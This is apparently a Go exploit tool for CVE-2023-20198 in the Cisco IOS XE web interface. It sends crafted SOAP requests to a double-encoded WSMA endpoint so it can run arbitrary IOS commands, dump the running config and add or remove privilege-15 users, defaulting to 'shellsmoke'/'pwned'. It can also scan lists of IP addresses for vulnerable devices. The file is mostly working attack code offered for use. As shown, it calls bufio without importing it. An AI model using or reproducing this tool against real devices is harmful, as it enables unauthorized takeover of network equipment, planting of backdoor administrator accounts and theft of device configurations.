package main

import (
	"bytes"
	"encoding/xml"
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"net"
	"net/http"
	"os"
	"strings"
)

// Variables for string manipulation
var (
	rExecCmd         = "<TMPEXECCMD>"
	rAddUserName     = "<TMPUSERNAME>"
	rAddUserPass     = "<TMPUSERPASS>"
	rAddUserMod      = "<TMPUSERMOD>"
	addUserDefName   = "shellsmoke"
	addUserDefPass   = "pwned"
	execCmdGetConfig = "sh run"
	execCmdCheck     = "uname -a"
	exURI            = "%2577eb%2575i_%2577sma_Http"
)

// Exec command template
var exTmpExecCmd = `<?xml version="1.0"?>
<SOAP:Envelope xmlns:SOAP="http://schemas.xmlsoap.org/soap/envelope/" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
<SOAP:Header>
<wsse:Security xmlns:wsse="http://schemas.xmlsoap.org/ws/2002/04/secext">
<wsse:UsernameToken SOAP:mustUnderstand="false">
<wsse:Username>admin</wsse:Username>
<wsse:Password>*****</wsse:Password>
</wsse:UsernameToken>
</wsse:Security>
</SOAP:Header>
<SOAP:Body>
<request correlator="exec1" xmlns="urn:cisco:wsma-exec">
<execCLI xsd="false">
<cmd><TMPEXECCMD></cmd>
<dialogue>
<expect>
</expect>
<reply>
</reply>
</dialogue>
</execCLI>
</request>
</SOAP:Body>
</SOAP:Envelope>`

// Add user template
var exTmpAddUser = `<?xml version="1.0"?>
<SOAP:Envelope xmlns:SOAP="http://schemas.xmlsoap.org/soap/envelope/" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
<SOAP:Header>
<wsse:Security xmlns:wsse="http://schemas.xmlsoap.org/ws/2002/04/secext">
<wsse:UsernameToken SOAP:mustUnderstand="false">
<wsse:Username>admin</wsse:Username>
<wsse:Password>*****</wsse:Password>
</wsse:UsernameToken>
</wsse:Security>
</SOAP:Header>
<SOAP:Body>
<request correlator="exec1" xmlns="urn:cisco:wsma-config">
<configApply details="all">
<config-data>
<cli-config-data-block>
<TMPUSERMOD>
</cli-config-data-block>
</config-data>
</configApply>
</request>
</SOAP:Body>
</SOAP:Envelope>`

// Structure to hold target information
type vCisco struct {
	ip   string
	url  string
	vuln bool
	ver  string
}

func parseArgs() (targetIP, targetFile, targetUrl, runSet string, runSetArgs []string, outFile, uScheme string) {
	var (
		tHttps      bool
		checkVuln   bool
		getConfig   bool
		execCmd     string
		addUser     bool
		delUser     bool
		addUserName string
		addUserPass string
		verbose     bool
	)
	flag.StringVar(&targetIP, "t", "", "Target IP Address")
	flag.StringVar(&targetFile, "l", "", "File containing IP Addresses (-c only)")
	flag.BoolVar(&tHttps, "https", false, "Use https")
	flag.BoolVar(&checkVuln, "c", false, "Check for vulnerability")
	flag.BoolVar(&getConfig, "g", false, "Get Cisco IOS running config")
	flag.StringVar(&execCmd, "e", "", "Execute Cisco IOS command")
	flag.BoolVar(&addUser, "a", false, "Add new priv 15 user")
	flag.BoolVar(&delUser, "d", false, "Remove priv 15 user")
	flag.StringVar(&addUserName, "u", addUserDefName, "User name for -a or -d")
	flag.StringVar(&addUserPass, "p", addUserDefPass, "New user pass for -a")
	flag.StringVar(&outFile, "o", "", "Write output to file")
	flag.BoolVar(&verbose, "v", false, "Increase verbosity")
	flag.Parse()

	if verbose {
		log.SetFlags(log.Lshortfile)
	} else {
		log.SetFlags(0)
	}

	if tHttps {
		uScheme = "https"
	} else {
		uScheme = "http"
	}

	if targetIP != "" {
		if net.ParseIP(targetIP) == nil {
			log.Fatalf("Input target %s is not a valid IP address!", targetIP)
		}
		targetUrl = fmt.Sprintf("%s://%s/%s", uScheme, targetIP, exURI)
	}

	if addUser {
		runSet = "addUser"
		runSetArgs = []string{"ADDUSER", addUserName, addUserPass}
	} else if delUser {
		runSet = "addUser"
		runSetArgs = []string{"DELUSER", addUserName}
	} else if execCmd != "" {
		runSet = "execCmd"
		runSetArgs = []string{execCmd}
	} else if getConfig {
		runSet = "execCmd"
		runSetArgs = []string{execCmdGetConfig}
	} else if checkVuln {
		runSet = "checkVuln"
		runSetArgs = []string{execCmdCheck}
	}

	return
}

func modExploit(runSet string, runSetArgs []string) string {
	var modEx string

	switch runSet {
	case "execCmd", "checkVuln":
		modEx = strings.ReplaceAll(exTmpExecCmd, rExecCmd, runSetArgs[0])
	case "addUser":
		modEx = exTmpAddUser
		if runSetArgs[0] == "ADDUSER" {
			mUserMod := fmt.Sprintf("username %s privilege 15 secret %s", runSetArgs[1], runSetArgs[2])
			modEx = strings.ReplaceAll(modEx, rAddUserMod, mUserMod)
		} else if runSetArgs[0] == "DELUSER" {
			mUserMod := fmt.Sprintf("no username %s privilege 15", runSetArgs[1])
			modEx = strings.ReplaceAll(modEx, rAddUserMod, mUserMod)
		}
	}

	return modEx
}

func formatOut(stage int, args ...interface{}) {
	switch stage {
	case 1:
		fmt.Printf("Selected Target:\t%s\n", args[0].(string))
		runSet := args[1].(string)
		runSetArgs := args[2].([]string)
		switch runSet {
		case "execCmd":
			fmt.Println("Running in Exec Mode")
			fmt.Printf("Executing Command:\t%s\n\n", runSetArgs[0])
		case "addUser":
			if runSetArgs[0] == "ADDUSER" {
				fmt.Println("Adding New Privilege 15 User")
				fmt.Printf("Add User Name:\t%s\n", runSetArgs[1])
				fmt.Printf("Add User Pass:\t%s\n\n", runSetArgs[2])
			} else if runSetArgs[0] == "DELUSER" {
				fmt.Println("Deleting Privilege 15 User")
				fmt.Printf("Del User Name:\t%s\n", runSetArgs[1])
			}
		}
	case 2:
		fmt.Println("Full SOAP request body:")
		fmt.Println(args[0].(string))
		fmt.Println()
	case 3:
		fmt.Printf("Sending exploit to target URL:\t%s\n", args[0].(string))
	case 4:
		exStat := args[1].(int)
		exContent := args[2].(string)
		if exStat == 200 && exContent == "text/xml" {
			fmt.Println("Responses look okay, exploit should have worked")
			fmt.Println()
		} else {
			fmt.Println("Responses don't look right, check verbose output")
		}
		fmt.Printf("Response Status Code:\t%d\n", exStat)
		fmt.Printf("Response Content-Type:\t%s\n", exContent)
		fmt.Println("HTTP Response Body:")
		fmt.Println(args[3].(string))
		fmt.Println()
	case 5:
		fmt.Printf("Writing command output to %s\n", args[0].(string))
	case 6:
		fmt.Println("Done.")
	case 100:
		fmt.Println("Testing for vulnerability")
		for _, vt := range args[0].([]string) {
			fmt.Println(vt)
		}
	case 101:
		fmt.Printf("Vulnerability check results written to %s\n", args[0].(string))
	}
}

func sendExploit(targetUrl, modEx string) (int, string, string) {
	client := &http.Client{}
	req, err := http.NewRequest("POST", targetUrl, bytes.NewBuffer([]byte(modEx)))
	if err != nil {
		log.Fatalf("Failed to create request: %v", err)
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("User-Agent", "CVE-2023-20198")

	resp, err := client.Do(req)
	if err != nil {
		log.Fatalf("Failed to send request: %v", err)
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		log.Fatalf("Failed to read response body: %v", err)
	}

	return resp.StatusCode, resp.Header.Get("Content-Type"), string(body)
}

func writeOut(runSet, exXml string) {
	if runSet == "execCmd" {
		type ExecResponse struct {
			Received struct {
				Text string `xml:"text"`
			} `xml:"received"`
		}
		var response ExecResponse
		if err := xml.Unmarshal([]byte(exXml), &response); err != nil {
			log.Fatalf("Failed to unmarshal XML: %v", err)
		}
		fmt.Println(response.Received.Text)
		fmt.Println()
	} else if runSet == "addUser" {
		fmt.Println("No reportable output from adding users")
		fmt.Println("Check verbose output or get running config")
	}
}

func writeFile(runSet, outFile string, exOut []string) {
	file, err := os.Create(outFile)
	if err != nil {
		log.Fatalf("Failed to create file: %v", err)
	}
	defer file.Close()

	for _, line := range exOut {
		file.WriteString(line + "\n")
	}
}

func exVulnCheck(targetIP, targetFile, runSet string, runSetArgs []string, outFile, uScheme string) {
	var targets []string
	var vtargets []vCisco

	if targetIP != "" {
		targets = append(targets, targetIP)
	} else if targetFile != "" {
		file, err := os.Open(targetFile)
		if err != nil {
			log.Fatalf("Failed to open file: %v", err)
		}
		defer file.Close()

		scanner := bufio.NewScanner(file)
		for scanner.Scan() {
			ip := scanner.Text()
			if net.ParseIP(ip) == nil {
				log.Printf("Invalid IP address in file: %s", ip)
				continue
			}
			targets = append(targets, ip)
		}
		if err := scanner.Err(); err != nil {
			log.Fatalf("Error reading file: %v", err)
		}
	}

	if len(targets) == 0 {
		log.Fatalln("No valid targets!")
	}

	modEx := modExploit(runSet, runSetArgs)
	for _, target := range targets {
		turl := fmt.Sprintf("%s://%s/%s", uScheme, target, exURI)
		exStat, exContent, exXml := sendExploit(turl, modEx)
		vc := vCisco{ip: target, url: turl}
		if exStat == 200 && exContent == "text/xml" {
			vc.vuln = true
			type ExecResponse struct {
				Received struct {
					Text string `xml:"text"`
				} `xml:"received"`
			}
			var response ExecResponse
			if err := xml.Unmarshal([]byte(exXml), &response); err != nil {
				log.Fatalf("Failed to unmarshal XML: %v", err)
			}
			vc.ver = response.Received.Text
		} else {
			vc.vuln = false
			vc.ver = "Unknown"
		}
		vtargets = append(vtargets, vc)
	}

	var vtargetsOut []string
	for _, vt := range vtargets {
		vtOut := fmt.Sprintf("Target IP:\t%s\nTarget URL:\t%s\nVulnerable:\t%t\nIOS Ver:\t%s\n", vt.ip, vt.url, vt.vuln, vt.ver)
		vtargetsOut = append(vtargetsOut, vtOut)
	}

	formatOut(100, vtargetsOut)
	if outFile != "" {
		writeFile(runSet, outFile, vtargetsOut)
		formatOut(101, outFile)
	}
	formatOut(6)
	os.Exit(0)
}

func main() {
	targetIP, targetFile, targetUrl, runSet, runSetArgs, outFile, uScheme := parseArgs()

	if runSet == "checkVuln" {
		exVulnCheck(targetIP, targetFile, runSet, runSetArgs, outFile, uScheme)
	}

	formatOut(1, targetIP, runSet, runSetArgs)
	modEx := modExploit(runSet, runSetArgs)
	formatOut(2, modEx)
	formatOut(3, targetUrl)
	exStat, exContent, exXml := sendExploit(targetUrl, modEx)
	formatOut(4, runSet, exStat, exContent, exXml)
	writeOut(runSet, exXml)
	if outFile != "" && runSet == "execCmd" {
		formatOut(5, outFile)
		writeFile(runSet, outFile, []string{exXml})
	}
	formatOut(6)
}
